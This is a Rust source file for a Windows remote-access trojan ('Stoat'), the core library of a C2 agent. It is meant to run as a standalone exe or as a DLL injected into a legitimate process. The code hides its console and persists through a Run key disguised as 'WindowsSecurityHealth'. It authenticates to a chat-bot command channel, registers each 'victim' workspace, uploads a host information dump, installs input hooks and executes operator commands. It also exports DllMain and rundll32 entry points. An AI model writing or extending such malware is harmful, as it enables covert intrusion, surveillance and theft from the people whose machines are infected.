// language: Rust, file: src/lib.rs, target: Windows
// Stoat C2 agent library. Built two ways:
//   rlib   -> linked by the standalone `stoat-rat` exe (src/main.rs)
//   cdylib -> stoat_rat.dll, injected into a legitimate host process by `dropper`
//
// Two entry points are exported for the DLL:
//   DllMain    -> fires on LoadLibrary; spawns the agent on its own thread
//   AgentInit  -> rundll32-compatible export (blocks), alternate host via
//                 `rundll32.exe <dll>,AgentInit`

/// Console I/O is wrapped so a windowless launch never panics writing to an invalid stdout.
/// Set RAT_CONSOLE=1 to print to the attached console, RAT_LOG=1 to append to %TEMP%\stoat-rat.log.
pub fn log_line(msg: &str, err: bool) {
    if std::env::var_os("RAT_CONSOLE").is_some() {
        use std::io::Write;
        if err {
            let _ = writeln!(std::io::stderr(), "{msg}");
        } else {
            let _ = writeln!(std::io::stdout(), "{msg}");
        }
    }
    if std::env::var_os("RAT_LOG").is_some() {
        use std::io::Write;
        let path = std::env::temp_dir().join("stoat-rat.log");
        if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(path) {
            let _ = writeln!(f, "{msg}");
        }
    }
}

macro_rules! println {
    ($($arg:tt)*) => { crate::log_line(&format!($($arg)*), false) };
}
macro_rules! eprintln {
    ($($arg:tt)*) => { crate::log_line(&format!($($arg)*), true) };
}

pub mod capture;
pub mod browsers;
pub mod commands;
pub mod config;
pub mod host;
pub mod info;
pub mod inject;
pub mod input;
pub mod stoat;
pub mod update;
pub mod volume;
pub mod workspace;

/// Build tag, surfaced in the online message so updates are visible.
pub const BUILD: &str = "b6";

use anyhow::Result;
use futures_util::{SinkExt, StreamExt};
use serde_json::{json, Value};
use std::collections::VecDeque;
use std::sync::{LazyLock, Mutex};
use std::time::Duration;
use tokio_tungstenite::connect_async;
use tokio_tungstenite::tungstenite::Message as Ws;

/// Recently processed message ids — the gateway can re-deliver an event (Bulk / reconnect).
static SEEN: LazyLock<Mutex<VecDeque<String>>> = LazyLock::new(|| Mutex::new(VecDeque::new()));

/// This victim's workspace (category + console/info/files), resolved after Ready.
static AGENT_WS: LazyLock<Mutex<Option<workspace::Workspace>>> =
    LazyLock::new(|| Mutex::new(None));

fn already_seen(id: &str) -> bool {
    let mut g = SEEN.lock().unwrap();
    if g.iter().any(|x| x == id) {
        return true;
    }
    g.push_back(id.to_string());
    if g.len() > 1024 {
        g.pop_front();
    }
    false
}

/// One agent per machine — a second launch exits instead of double-replying to commands.
#[cfg(windows)]
fn claim_singleton() -> bool {
    use windows_sys::Win32::Foundation::GetLastError;
    use windows_sys::Win32::System::Threading::CreateMutexW;
    let name: Vec<u16> = "Local\\stoat_rat_singleton"
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    unsafe {
        let h = CreateMutexW(std::ptr::null(), 1, name.as_ptr());
        if h.is_null() {
            return true;
        }
        GetLastError() != 183 // ERROR_ALREADY_EXISTS
    }
}

#[cfg(not(windows))]
fn claim_singleton() -> bool {
    true
}

/// Hide the console window on a real deployment. Debug builds and RAT_CONSOLE=1 keep it.
#[cfg(windows)]
fn hide_console() {
    if cfg!(debug_assertions) || std::env::var_os("RAT_CONSOLE").is_some() {
        return;
    }
    unsafe {
        use windows_sys::Win32::System::Console::GetConsoleWindow;
        use windows_sys::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};
        let hwnd = GetConsoleWindow();
        if !hwnd.is_null() {
            ShowWindow(hwnd, SW_HIDE);
        }
    }
}

#[cfg(not(windows))]
fn hide_console() {}

/// Full agent bring-up. Called by the standalone exe and by the injected DLL thread.
pub async fn run_agent() -> Result<()> {
    if !claim_singleton() {
        eprintln!("[!] another stoat-rat instance is already running; exiting");
        #[cfg(windows)]
        if std::env::var_os("RAT_CONSOLE").is_some() {
            host::message_box("stoat-rat", "stoat-rat is already running on this machine.");
        }
        return Ok(());
    }

    let cfg = config::Config::load()?;

    // Testing switch: purge installed files and exit without connecting.
    if std::env::var_os("RAT_UNINSTALL").is_some() {
        let (run_status, removed, dll) = host::purge_install();
        println!(
            "[i] uninstall: run key {run_status}; removed {} path(s); dll {}",
            removed.len(),
            dll.display()
        );
        host::schedule_self_cleanup(&dll);
        return Ok(());
    }

    // Testing switch: run an update without an operator command.
    //   RAT_UPDATE=1          stage + relaunch
    //   RAT_UPDATE_DRYRUN=1   stage only
    if std::env::var_os("RAT_UPDATE").is_some() || std::env::var_os("RAT_UPDATE_DRYRUN").is_some() {
        if let Some(control) = cfg.channel.clone() {
            match stoat::Stoat::new(&cfg.api, &cfg.autumn, &cfg.token).await {
                Ok(bot) => match workspace::ensure(&bot, &control).await {
                    Ok(ws) => match update::stage(&bot, &cfg, &ws).await {
                        Ok(Some(label)) => {
                            println!("[i] update staged: {label}");
                            if std::env::var_os("RAT_UPDATE_DRYRUN").is_none() {
                                match update::relaunch_and_exit() {
                                    Ok(()) => std::process::exit(0),
                                    Err(e) => eprintln!("[!] relaunch failed: {e:#}"),
                                }
                            }
                        }
                        Ok(None) => println!("[i] update: already on the newest build"),
                        Err(e) => eprintln!("[!] update failed: {e:#}"),
                    },
                    Err(e) => eprintln!("[!] update workspace: {e:#}"),
                },
                Err(e) => eprintln!("[!] update auth: {e:#}"),
            }
        }
        return Ok(());
    }

    // Remove a leftover from a previous self-update.
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            let _ = std::fs::remove_file(dir.join("stoat-rat.old"));
        }
    }

    // When launched by the loader, keep the Run entry pointed at this exe.
    if std::env::var_os("RAT_PERSIST").is_some() {
        let name = std::env::var("RAT_NAME").unwrap_or_else(|_| "WindowsSecurityHealth".into());
        match host::ensure_autostart(&name) {
            Ok(p) => eprintln!("[i] autostart ensured -> {p}"),
            Err(e) => eprintln!("[!] autostart failed: {e:#}"),
        }
    }
    println!("[+] stoat-rat starting (api {})", cfg.api);

    let bot = stoat::Stoat::new(&cfg.api, &cfg.autumn, &cfg.token).await?;
    println!("[+] authenticated as bot {}", bot.bot_id);

    input::start_hooks();
    input::init_freeze_thread();

    loop {
        match gateway(&cfg, bot.clone()).await {
            Ok(()) => {
                eprintln!("[!] gateway closed; reconnecting in 5s");
            }
            Err(e) => eprintln!("[!] gateway error: {e:#}; reconnecting in 5s"),
        }
        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

/// Entry for the standalone exe.
pub async fn run_from_exe() -> Result<()> {
    hide_console();
    run_agent().await
}

async fn gateway(cfg: &config::Config, bot: stoat::Stoat) -> Result<()> {
    let (ws, _) = connect_async(cfg.ws.as_str()).await?;
    let (mut tx, mut rx) = ws.split();

    tx.send(Ws::Text(
        json!({ "type": "Authenticate", "token": cfg.token })
            .to_string()
            .into(),
    ))
    .await?;
    println!("[+] gateway connected -> {}", cfg.ws);

    let mut ping = tokio::time::interval(Duration::from_secs(30));
    loop {
        tokio::select! {
            _ = ping.tick() => {
                let _ = tx
                    .send(Ws::Text(json!({ "type": "Ping", "data": 0 }).to_string().into()))
                    .await;
            }
            incoming = rx.next() => {
                match incoming {
                    Some(Ok(Ws::Text(t))) => {
                        if let Ok(v) = serde_json::from_str::<Value>(t.as_str()) {
                            process(&cfg, &bot, v);
                        }
                    }
                    Some(Ok(Ws::Close(_))) | None => return Ok(()),
                    Some(Err(e)) => return Err(e.into()),
                    _ => {}
                }
            }
        }
    }
}

fn process(cfg: &config::Config, bot: &stoat::Stoat, v: Value) {
    match v["type"].as_str().unwrap_or("") {
        "Authenticated" => eprintln!("[i] gateway authenticated"),
        "Ready" => {
            if let Some(srv) = v["servers"].as_array() {
                eprintln!("[i] bot is in {} server(s):", srv.len());
                for s in srv {
                    eprintln!(
                        "    server {}  {}",
                        s["_id"].as_str().unwrap_or("?"),
                        s["name"].as_str().unwrap_or("?")
                    );
                }
            }
            if let Some(chans) = v["channels"].as_array() {
                eprintln!("[i] bot can see {} channel(s):", chans.len());
                for c in chans {
                    eprintln!(
                        "    channel {}  {}  [{}]",
                        c["_id"].as_str().unwrap_or("?"),
                        c["name"].as_str().unwrap_or("(unnamed)"),
                        c["channel_type"].as_str().unwrap_or("?")
                    );
                }
            }
            if let Some(control) = cfg.channel.clone() {
                let bot = bot.clone();
                let cfg2 = cfg.clone();
                tokio::spawn(async move {
                    match workspace::ensure(&bot, &control).await {
                        Ok(ws) => {
                            eprintln!(
                                "[i] victim workspace: {} -> console {} / info {} / files {}",
                                ws.label, ws.channels.console, ws.channels.info, ws.channels.files
                            );
                            *AGENT_WS.lock().unwrap() = Some(ws.clone());
                            let _ = bot
                                .send(
                                    &ws.channels.console,
                                    &format!("agent online: {} [{}]", ws.label, BUILD),
                                )
                                .await;
                            // Keep #information to a single, current dump.
                            let _ = bot.purge_channel(&ws.channels.info).await;
                            let text = info::dump(&cfg2, &ws).await;
                            let _ = bot.send_code(&ws.channels.info, &text).await;
                        }
                        Err(e) => eprintln!("[!] workspace setup failed: {e:#}"),
                    }
                });
            }
        }
        "Message" => handle_message(cfg, bot, &v),
        "Bulk" => {
            if let Some(arr) = v["v"].as_array() {
                for item in arr {
                    if item["type"].as_str() == Some("Message") {
                        handle_message(cfg, bot, item);
                    }
                }
            }
        }
        "Logout" => {
            eprintln!("[!] session invalidated; exiting");
            std::process::exit(0);
        }
        _ => {}
    }
}

fn handle_message(cfg: &config::Config, bot: &stoat::Stoat, v: &Value) {
    let author = v["author"].as_str().unwrap_or("");
    let channel = v["channel"].as_str().unwrap_or("");
    let content = v["content"].as_str().unwrap_or("");
    let id = v["_id"].as_str().unwrap_or("");

    if std::env::var_os("RAT_DEBUG").is_some() {
        eprintln!("[d] ch={channel} author={author} content={content:?}");
    }

    if !id.is_empty() && already_seen(id) {
        return;
    }
    if author.is_empty() || author == bot.bot_id.as_str() || channel.is_empty() {
        return;
    }
    if !content.starts_with(&cfg.prefix) {
        return;
    }
    if let Some(op) = &cfg.operator {
        if author != op {
            return;
        }
    }

    // Accept commands from the control channel and from this victim's console channel.
    // `!exit` is honored from any channel (operator-only) so the agent can always be stopped.
    let ws = AGENT_WS.lock().unwrap().clone();
    let is_control = cfg.channel.as_deref().map(|c| c == channel).unwrap_or(true);
    let is_console = ws
        .as_ref()
        .map(|w| w.channels.console == channel)
        .unwrap_or(false);
    let word = content
        .trim_start_matches(&cfg.prefix)
        .trim()
        .to_ascii_lowercase();
    let is_exit = word == "exit" || word == "quit";
    if !is_control && !is_console && !is_exit {
        return;
    }

    let attachments: Vec<Value> = v["attachments"].as_array().cloned().unwrap_or_default();
    let bot = bot.clone();
    let cfg = cfg.clone();
    let content = content.to_string();
    // Before the workspace exists, route everything back to the origin channel.
    let ws = ws.unwrap_or_else(|| workspace::Workspace {
        server: String::new(),
        category_id: String::new(),
        victim_id: String::new(),
        label: String::new(),
        channels: workspace::Channels {
            console: channel.to_string(),
            info: channel.to_string(),
            files: channel.to_string(),
        },
    });

    tokio::spawn(async move {
        let reply = ws.channels.console.clone();
        if let Err(e) = commands::dispatch(&bot, &cfg, &ws, &content, &attachments).await {
            let _ = bot.send(&reply, &format!("error: {e:#}")).await;
        }
    });
}

// ---------------------------------------------------------------- DLL entry points

#[cfg(windows)]
const DLL_PROCESS_ATTACH: u32 = 1;

/// Fires when the loader injects this DLL. Spawns the agent on its own thread so the
/// host process is never blocked.
#[cfg(windows)]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    _module: *mut core::ffi::c_void,
    reason: u32,
    _reserved: *mut core::ffi::c_void,
) -> i32 {
    if reason == DLL_PROCESS_ATTACH {
        std::thread::spawn(|| {
            let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
                Ok(rt) => rt,
                Err(_) => return,
            };
            let _ = rt.block_on(run_agent());
        });
    }
    1
}

/// `rundll32 <dll>,AgentInit` entry. Blocks so rundll32 stays alive as the host.
#[cfg(windows)]
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn AgentInit(
    _hwnd: *mut core::ffi::c_void,
    _hinst: *mut core::ffi::c_void,
    _cmd: *mut i8,
    _show: i32,
) {
    let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
        Ok(rt) => rt,
        Err(_) => return,
    };
    let _ = rt.block_on(run_agent());
}
